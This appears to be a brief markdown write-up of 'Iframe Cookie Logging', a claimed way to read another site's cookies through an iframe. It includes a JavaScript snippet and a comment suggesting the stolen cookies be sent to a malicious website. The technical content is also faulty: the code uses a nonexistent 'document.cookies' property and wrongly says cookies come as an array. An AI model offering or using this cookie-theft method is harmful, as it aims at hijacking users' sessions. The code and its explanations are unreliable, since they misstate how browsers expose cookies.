# ICL
ICL, also known as Iframe Cookie Logging is a method that gets cookies in a iframe element. ICL is really easy to implement as it uses built-in JS functions. We load the iframe and we can get the cookies in it.

### Should i worry about this method?
No, most websites like ROBLOX, Twitter and other sites have implemented a feature that blocks any third party iframes from accessing its contents which prevents this method from being used. And yes this only works on IE, (maybe legacy microsoft edge) and yeah.


````js
 var iframe = document.getElementById("foo"); // your frame id or point to a element.
  var cookies = iframe.contentWindow.document.cookies; // It comes in a array, to get a certain cookie  use the [], like if i weree getting the 2 cookie i would do [1] // (Computers count from 0)
  alert(cookies)
  
  // Now the cookies element has been defined, you can
  // send it to a malicious website, store it on a
  // database and yeah. Treat it like it was your
  // site and you executing JS.
````
